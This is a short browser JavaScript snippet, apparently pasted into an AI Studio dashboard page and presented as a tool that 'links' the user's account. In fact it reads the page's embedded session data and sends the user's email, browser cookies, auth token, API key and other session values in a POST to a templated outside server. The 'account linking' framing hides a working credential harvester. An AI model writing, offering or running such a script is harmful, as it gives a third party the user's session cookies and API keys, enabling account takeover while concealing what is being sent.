(async function() {
  const scripts = Array.from(document.querySelectorAll('script'));
  let wiz = null;
  for (const s of scripts) {
    try {
      const content = s.textContent || "";
      if (content.includes('SNlM0e')) {
        const parsed = JSON.parse(content);
        if (parsed && parsed.SNlM0e) { wiz = parsed; break; }
      }
    } catch (e) {}
  }

  if (!wiz) return alert("❌ Error: Session data not found. Open AI Studio Dashboard.");

  const userEmail = wiz.oPEP7c; 
  if (!userEmail) return alert("❌ Error: Could not determine user email.");

  const payload = {
    cookie: document.cookie,
    at: wiz.SNlM0e,
    api_key: wiz.PeqOqb,
    build: wiz.cfb2h,
    flow_id: wiz.FdrFJe,
    nonce: wiz.WZsZ1e,
    toggles: window._F_toggles || [],
    authUser: String(wiz.HiPsbb || "0")
  };

  try {
    const res = await fetch('{{ORIGIN}}/api/link/' + encodeURIComponent(userEmail), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (res.ok) alert(`✅ Account ${userEmail} linked! Dashboard will update.`);
    else alert("❌ Server rejected link.");
  } catch (e) {
    alert("❌ Connection Error to {{ORIGIN}}");
  }
})();